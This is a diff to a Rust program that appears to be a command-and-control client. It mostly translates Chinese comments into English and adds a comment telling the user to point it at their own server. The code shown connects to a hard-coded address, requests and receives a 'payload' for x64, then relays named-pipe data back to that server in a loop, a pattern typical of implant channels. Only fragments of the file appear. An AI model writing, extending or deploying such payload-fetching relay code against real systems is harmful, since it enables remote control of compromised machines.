@@ -4,6 +4,7 @@ use std::net::TcpStream;
 use std::{thread, time};
 
 const DEBUG: bool = true;
+// modify the IP address and pipe name to your server
 const CONSOLE_ADDR: &str = "192.168.0.107:2222";
 const PIPE_NAME: &str = "RustTest";
 
@@ -93,11 +94,11 @@ impl PipeChannel {
 }
 
 fn main() {
-    //与服务端建立TCP连接
+    //set up TCP connection with server
     let mut socket = SocketChannel {
         socket: TcpStream::connect(CONSOLE_ADDR).unwrap(),
     };
-    //接收服务端传来的载荷
+    //receiver the payload from server
     socket
         .send_data(&mut "arch=x64".as_bytes().to_vec())
         .unwrap();
@@ -125,7 +126,7 @@ fn main() {
 
     println!("Connect Pipe Done");
 
-    //读写pipe
+    //read from pipe and send to server
     loop {
         thread::sleep(ten_millis);
         let mut from_pipe = pipe.read_pipe().unwrap();
